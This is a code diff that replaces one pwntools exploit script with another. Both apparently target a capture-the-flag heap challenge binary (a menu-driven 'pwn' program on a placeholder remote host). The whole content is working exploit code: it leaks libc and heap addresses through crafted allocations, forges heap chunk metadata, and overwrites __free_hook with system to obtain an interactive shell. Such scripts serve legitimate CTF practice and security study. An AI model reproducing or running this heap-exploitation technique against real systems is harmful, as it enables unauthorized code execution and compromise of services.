@@ -1,146 +1,126 @@
-#!/usr/bin/python2
-# -*- coding:utf-8 -*-
-
 from pwn import *
-import os
-import struct
-import random
-import time
-import sys
-import signal
 
-salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+debug=0
 
-def clear(signum=None, stack=None):
-    print('Strip  all debugging information')
-    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
-    exit(0)
+context.log_level='debug'
 
-for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
-    signal.signal(sig, clear)
+if debug:
+    p=process('./pwn')
+    #p=process('',env={'LD_PRELOAD':'./libc.so'})
+    gdb.attach(p)
+else:
+    p=remote('xxxxxxxx', 10001)
 
-# # Create a symbol file for GDB debugging
-# try:
-#     gdb_symbols = '''
+def ru(x):
+    return p.recvuntil(x)
 
-#     '''
+def se(x):
+    p.send(x)
 
-#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
-#     f.write(gdb_symbols)
-#     f.close()
-#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
-#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
-# except Exception as e:
-#     print(e)
+def sl(x):
+    p.sendline(x)
 
-context.arch = 'amd64'
-# context.arch = 'i386'
-# context.log_level = 'debug'
-execve_file = './pwn'
-# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
-# sh = process(execve_file)
-sh = remote('xxxxxxxxx', 10001)
-elf = ELF(execve_file)
-libc = ELF('./libc-2.23.so')
-# libc = ELF('/glibc/glibc-2.23/debug_x86/lib/libc.so.6')
+def add(sz,name,price):
+    sl('1')
+    ru('length: ')
+    sl(str(sz))
+    ru('Name: ')
+    se(name)
+    ru('Price: ')
+    sl(str(price))
+    ru('>>> ')
 
-# Create temporary files for GDB debugging
-try:
-    gdbscript = '''
-    b *$rebase(0x12BA)
-    '''
+def comment(idx,content,score):
+    sl('2')
+    ru('Index: ')
+    sl(str(idx))
+    ru('Comment on')
+    se(content)
+    ru('score:')
+    sl(str(score))
+    ru('>>> ')
 
-    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
-    f.write(str(proc.pidof(sh)[0]))
-    f.close()
+def throw(idx):
+    sl('3')
+    ru('index: ')
+    sl(str(idx))
+    ru('Comment ')
+    data = ru(' will')[:-5]
+    ru('>>> ')
+    return data
 
-    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
-    f.write(gdbscript)
-    f.close()
-except Exception as e:
-    print(e)
+add(0x200,'a\n',100)
+add(0x100,'a\n',200)
+comment(0,'aaaa\n',100)
+throw(0)
+add(0x10,'a\n',100)
+comment(0,'a',100)
+libc = u32(throw(0)[4:8])
+if debug:
+    base = libc-0x1b27b0
+else:
+    base = libc-0x1b07b0
 
-def Purchase(length, name):
-    sh.sendlineafter('>>> ', '1')
-    sh.sendlineafter('Name length: ', str(length))
-    sh.sendafter('Name: ', name)
-    sh.sendlineafter('Price: ', str(1))
+throw(1)
+add(0x200,'c'*20+'\n',100)
+throw(0)
+add(0xc,'wwwww\n',100)
+comment(0,'a'*0x10,200)
 
-def Comment(index, comment):
-    sh.sendlineafter('>>> ', '2')
-    sh.sendlineafter('Index: ', str(index))
-    sh.sendafter(' : ', comment)
-    sh.sendlineafter('And its score: ', str(1))
+heap = u32(throw(0)[0x10:0x14])-0x48
 
-def Throw(index):
-    sh.sendlineafter('>>> ', '3')
-    sh.sendlineafter('WHICH IS THE RUBBISH PC? Give me your index: ', str(index))
+for i in range(8):
+    add(0x10,'a\n',100)
+for i in range(8):
+    throw(i)
 
-Purchase(0x8c, 'a\n')
-Purchase(0x8c, 'b\n')
-Comment(0, 'a')
-Comment(1, 'b')
+add(0x10,'b\n',200) #0
+add(0xa0,'a\n',100) #1
+add(0xfc,'a\n',100) #2
+add(0xfc,'b\n',200) #3
+add(0xfc,'c\n',300) #4
 
-Throw(0)
-Throw(1)
-Purchase(1, 'a')
-Comment(0, '\x40')
-Throw(0)
-sh.recvuntil('Comment ')
-sh.recvn(8)
-result = sh.recvn(4)
-main_arena_addr = u32(result) - 48
-log.success('main_arena_addr: ' + hex(main_arena_addr))
+throw(2)
+add(0xfc,(p32(0)*3+p32(0xf1)+p32(heap+0x288)+p32(heap+0x288)+p32(heap+0x278)*4).ljust(0xf8,'a')+p32(0xf0),200) #2
+throw(3)
+add(0xec,'a\n',100) #3
+add(0xfc,'b\n',200) #5
 
-libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x18)
-log.success('libc_addr: ' + hex(libc_addr))
+throw(3)
 
-Purchase(0xf4, 'c\n')
-Purchase(0x74, 'd\n')
-# 0x2d
-Purchase(0xfc, 'e\n')
-Throw(0)
-Purchase(0xfc, 'f\n')
-Throw(2)
-Purchase(0xfc, '\0' * 0xf8 + p32(0x1c8))
-Purchase(0x104, '/bin/sh\0\n')
-Purchase(0x104, '/bin/sh\0\n')
-Purchase(0x104, '/bin/sh\0\n')
-# pause()
-Throw(4)
-Throw(0)
+add(0x2c,'qqqqqq\n',100) #3
+add(0xbc,'a\n',100) #6
 
-Purchase(0x9c, 'g\n')
-Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(main_arena_addr + 8) + '\n') # 
-# Comment(2, 'b')
-sh.sendlineafter('>>> ', '2')
-sh.sendlineafter('Index: ', str(2))
-sh.recvuntil('Comment on ')
-result = sh.recvn(4)
-heap_addr = u32(result) - 0x30
-log.success('heap_addr: ' + hex(heap_addr))
-sh.sendafter(' : ', 'b')
-sh.sendlineafter('And its score: ', str(1))
+throw(3)
 
-Throw(4)
-Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(heap_addr + 8) + '\n') # 
-# pause()
-Throw(2)
+throw(2)
 
-sh.sendlineafter('>>> ', '1')
-sh.sendlineafter('Name length: ', str(0x2c))
-sh.sendafter('Name: ', p32(libc_addr + libc.symbols['__free_hook'] - 12) + p32(libc_addr + libc.symbols['__free_hook'] + 0x10) + p32(libc_addr + libc.symbols['__free_hook']) + '\n')
-sh.sendlineafter('Price: ', str(0x21))
+#free_hook =  base + 0x1b38b0
+free_hook = base + 0x1b18b0
 
-sh.sendlineafter('>>> ', '2')
-sh.sendlineafter('Index: ', str(1))
-sh.sendafter(' : ', '\n')
-sh.sendlineafter('And its score: ', str(0x21))
 
-Throw(2)
-Purchase(0x1c, p32(libc_addr + libc.symbols['system']) + '\n')
+add(0xfc,p32(0)*3+p32(0x31)+p32(heap)+'\n',100) #2
+add(0x2c,p32(0)+p32(heap+0x8)+p32(0)+p32(free_hook)+p32(0)+p32(heap+0x298)+'/bin/sh\0'+'\n',100) #3
 
-Throw(5)
 
-sh.interactive()
-clear()
+add(0x2c,p32(heap+0x290)+p32(heap+0x280)+'\n',100) #7
+
+sl('4')
+ru('Give me an index: ')
+sl('1')
+sleep(0.5)
+se(p32(heap+0x290)+p32(heap+0x288))
+ru('Wanna get more power?(y/n)')
+
+sl('y')
+ru('Give me serial:')
+se('e4SyD1C!')
+sleep(0.5)
+#se('a'+p32(base+0x3ada0))
+se('a'+p32(base+0x3a940))
+
+
+print(hex(free_hook))
+print(hex(base))
+print(hex(heap))
+p.interactive()
